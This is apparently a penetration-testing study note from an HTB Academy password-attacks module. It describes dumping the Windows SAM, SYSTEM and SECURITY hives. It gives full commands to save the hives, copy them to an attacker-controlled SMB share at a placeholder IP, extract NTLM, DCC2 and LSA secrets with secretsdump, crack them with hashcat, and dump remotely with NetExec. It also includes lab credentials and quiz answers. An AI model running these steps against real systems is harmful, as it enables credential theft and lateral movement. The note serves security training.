# NOTE — Attacking SAM, SYSTEM, and SECURITY

## ID
512

## Module
Password Attacks

## Kind
methodology

## Title
Section 11 — Attacking SAM, SYSTEM, and SECURITY

## Description
Dump the three sensitive registry hives (SAM, SYSTEM, SECURITY) from a Windows host, extract NTLM + DCC2 + DPAPI material with secretsdump, and crack NTLM hashes with Hashcat. Includes remote dumping with NetExec.

## Tags
sam, system, security-hive, reg-save, secretsdump, dpapi, dcc2, lsa-secrets, netexec, hashcat, ntlm

## Commands
- `reg.exe save hklm\sam C:\sam.save`
- `reg.exe save hklm\system C:\system.save`
- `reg.exe save hklm\security C:\security.save`
- `sudo impacket-smbserver -smb2support CompData /path/to/dir`
- `move C:\sam.save \\<attacker_ip>\CompData`
- `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- `hashcat -m 2100 '$DCC2$10240#user#hash' rockyou.txt`
- `netexec smb <ip> --local-auth -u <user> -p <pass> --sam`
- `netexec smb <ip> --local-auth -u <user> -p <pass> --lsa`

## Concept Overview
The three hives unlock different credential troves:

| Hive | Contains |
|------|----------|
| `HKLM\SAM` | Local account NTLM hashes (encrypted with bootkey from SYSTEM) |
| `HKLM\SYSTEM` | Boot key — needed to decrypt SAM |
| `HKLM\SECURITY` | LSA secrets, DCC2 (cached domain hashes), DPAPI master keys, service account passwords |

You always grab all three together — extracting just SAM is useless without SYSTEM, and SECURITY often contains the most valuable loot anyway.

## Methodology — Local Dump

1. **Open admin cmd**, then save the hives:
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

2. **On attacker host**, start an SMB share:
```bash
sudo impacket-smbserver -smb2support CompData /home/user/loot
```

3. **Exfil from target:**
```cmd
move C:\sam.save \\<attacker_ip>\CompData
move C:\system.save \\<attacker_ip>\CompData
move C:\security.save \\<attacker_ip>\CompData
```

4. **Extract on attacker host:**
```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Reading secretsdump Output
Format: `username:rid:lmhash:nthash:::`

```
Administrator:500:aad3b435...:31d6cfe0...:::    ← Administrator NT hash
bob:1001:aad3b435...:64f12cdd...:::            ← user bob NT hash
[*] Dumping cached domain logon information (domain/username:hash)
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555...
[*] Dumping LSA Secrets
DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d...
dpapi_userkey:0x7995f82c...
```

- `aad3b435b51404eeaad3b435b51404ee` = empty LM hash (LM disabled). Ignore.
- The RID 500 account = local Administrator (renaming doesn't change RID).

## Cracking

### NTLM Hashes (fast)
```bash
cut -d ':' -f 4 dumped.txt > nthashes.txt
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt
```

### DCC2 Hashes (slow)
~800× slower than NTLM. Only crackable if the password is weak.
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

## Remote Dump with NetExec
Skip the manual `reg save` + smbserver dance — NetExec does it all if you already have admin creds:

```bash
# SAM hashes
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

# LSA secrets (DCC2 + DPAPI + service creds in cleartext when possible)
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

`--lsa` is often where you find service-account passwords stored *in cleartext*.

## DPAPI Notes
After dumping `HKLM\SECURITY` you'll get:
- `dpapi_machinekey` — used to decrypt machine-bound DPAPI blobs (services, scheduled tasks)
- `dpapi_userkey` — used to derive per-user DPAPI master keys

Tools that use these: `mimikatz dpapi::chrome`, Impacket `dpapi.py`, `DonPAPI`, `SharpDPAPI`.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Where is the SAM database located in the registry? | **`HKLM\SAM`** | Reading the section |
| Q2 — Crack ITbackdoor's password | **(hidden — see HTB walkthrough)** | `reg save` all three hives → `secretsdump` → grab ITbackdoor's NTLM → `hashcat -m 1000 ... rockyou.txt` |
| Q3 — Discover credentials stored in LSA secrets (format `username:password`) | **(hidden)** | `netexec smb <ip> --local-auth -u bob -p HTB_@cademy_stdnt! --lsa` — service account creds appear in cleartext |

## Key Takeaways
- All three hives or none. `secretsdump` needs SAM + SYSTEM at minimum; SECURITY adds DCC2 + LSA secrets.
- LSA secrets frequently contain service-account passwords in *cleartext* — this is a common path to lateral movement that doesn't need any cracking.
- The first hash row in SAM dump (RID 500) is always the local Administrator regardless of rename.
- NetExec `--sam --lsa --ntds` covers all the dump variants from a single command if you have remote admin.

## Gotchas
- `reg save` requires elevation. Without admin, you'll get "Access is denied."
- Old `secretsdump` versions don't handle modern bootkey encryption (Win 11 22H2+). Keep Impacket updated.
- `aad3b435b51404eeaad3b435b51404ee` is the LM hash for *empty string* — appears constantly because LM is disabled. It is NOT a real hash to crack.
- DCC2 = MS-Cache v2 = the cached domain logon hash. Different from NTLM. Slow.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[10-windows-authentication-process]] | [[12-attacking-lsass]] →
<!-- AUTO-LINKS-END -->
